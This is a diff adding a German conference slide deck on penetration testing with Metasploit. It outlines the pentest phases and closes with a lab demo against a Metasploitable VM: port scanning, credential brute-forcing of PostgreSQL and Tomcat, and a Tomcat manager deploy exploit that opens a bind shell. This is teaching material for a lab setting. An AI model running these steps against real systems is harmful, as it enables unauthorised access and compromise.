@@ -1,0 +1,130 @@
+#+STARTUP: beamer
+#+LaTeX_CLASS: beamer
+#+MACRO: BEAMERMODE presentation
+#+MACRO: BEAMERTHEME Berlin
+#+MACRO: BEAMERCOLORTHEME beetle
+#+MACRO: BEAMERINSTITUTE Linuxwochenende 2011
+#+TITLE: Penetrationstests mit Metasploit
+#+AUTHOR: Michael Kohl
+
+* Einleitung
+** Über mich
+*** Früher: Linux/Unix Admin / Systems Engineer
+*** Jetzt: Rails-Entwickler, DevOps
+*** Ab Oktober: Penetration Tester
+*** Gentoo Entwickler, Metalab, RubyLearning, etc.
+** Warum Penetration Testing?
+*** Schwachstellen identifizieren
+*** Aufdecken von Fehlern aus falscher Bedienung
+*** Erhöhung der Sicherheit auf technischer und organisatorischer Ebene
+*** externe Validierung der Sicherheit
+* Penetration Testing
+** Pre-Engagement
+*** Zieldefinition (z.B. compliance)
+*** Abklären der Rahmenbedingungen (z.B. overt/covert)
+*** Limitierungen (z.B. nur Kernarbeitszeit, Wochenenden)
+*** Umfang (Netzwerk, Apps, WLAN, physische Tests, Social Engineering)
+*** Kommunikationswege definieren
+** Intelligence Gathering
+*** Versuch möglichst viel über Ziel herauszufinden
+*** Social Media
+*** Footprinting
+*** Portscans
+*** Firewalls etc?
+*** physische Locations
+** Threat Modeling
+*** benutzt Informationen aus dem vorherigen Schritt
+*** Versuch vielversprechendsten Angriffsvektor zu finden
+*** in die Rolle des Angreifers versetzen
+**** Analyse von Assets
+**** Analyse der Geschäftsprozesse
+**** Unternehmenstruktur
+**** Attacken auf ähnliche Unternehmen
+** Vulnerability Analysis
+*** Port- und Service-Scans
+*** Banner Grabbing
+*** SQL Injection Scanner
+*** Traffic Monitoring
+** Exploitation
+*** "spektakulärste" Phase
+*** nach Indentifikation der vielversprechenden Vektoren
+*** Exploits für bekannte Versionen
+*** Buffer Overflows, SQL Injections, Passwort Bruteforce etc.
+** Post Exploitation
+*** nach dem Kompromittieren eines oder mehrerer Systeme
+*** Identifikation wichtiger Infrastruktur
+*** Identifikation wichtigster Daten
+*** Schwachstellen mit grösstem Business Impact
+*** Aufräumen
+** Reporting
+*** wichtigster Teil
+*** was?
+*** wie?
+*** wie reparieren?
+*** generelle Security, nicht nur technische Schwachstellen
+* Metasploit
+** Metasploit Framework
+*** Penetration Testing Framework in Ruby
+*** Scanner/Fuzzer
+*** Payloads
+*** Exploits
+*** Post-Exploitation Tools (Meterpreter)
+*** Libraries zur Entwicklung eigener Tools
+* Demo
+** Demo
+*** Metasploitable VM
+*** prinzipieller Ablauf, kein vollständiger Pen Test
+*** Demo                                                           :noexport:
+msf > db_connect tupalero@metasploitable
+
+sudo nmap -sT -Pn 10.20.30.164 -oX metasploitable.xml
+
+msf > db_import metasploitable.xml
+[*] Importing 'Nmap XML' data
+[*] Importing host 10.20.30.164
+[*] Successfully imported /Users/michi/metasploitable.xml
+
+msf > db_services
+
+msf > setg RHOSTS 10.20.30.164
+RHOSTS => 10.20.30.164
+
+msf > use scanner/ftp/anonymous
+msf auxiliary(anonymous) > show options
+msf auxiliary(anonymous) > run
+
+msf > search postgres
+
+msf auxiliary(anonymous) > use scanner/postgres/postgres_login
+msf auxiliary(postgres_login) > show options
+
+msf auxiliary(postgres_login) > run
+BAZINGA!
+
+psql -h 192.168.178.30 -U postgres
+\\du
+
+msf > use scanner/http/tomcat_mgr_login
+msf auxiliary(tomcat_mgr_login) > set RPORT 8180
+msf auxiliary(tomcat_mgr_login) > run
+BAZINGA!
+
+msf exploit(tomcat_mgr_deploy) > set USERNAME tomcat
+USERNAME => tomcat
+msf exploit(tomcat_mgr_deploy) > set PASSWORD tomcat
+PASSWORD => tomcat
+msf exploit(tomcat_mgr_deploy) > set RHOST 10.20.30.164
+RHOST => 192.168.178.30
+msf exploit(tomcat_mgr_deploy) > set PAYLOAD linux/x86/shell_bind_tcp
+msf exploit(tomcat_mgr_deploy) > exploit -j
+msf exploit(tomcat_mgr_deploy) > sessions -l
+msf exploit(tomcat_mgr_deploy) > sessions -i n
+
+* Ressourcen
+** Ressourcen
+*** http://de.wikipedia.org/wiki/Penetrationstest_(Informatik)
+*** http://www.pentest-standard.org/index.php/Main_Page
+*** http://www.metasploit.com/
+*** http://www.offensive-security.com/metasploit-unleashed/
+*** http://nostarch.com/metasploit
+*** http://www.offensive-security.com/metasploit-unleashed/Metasploitable
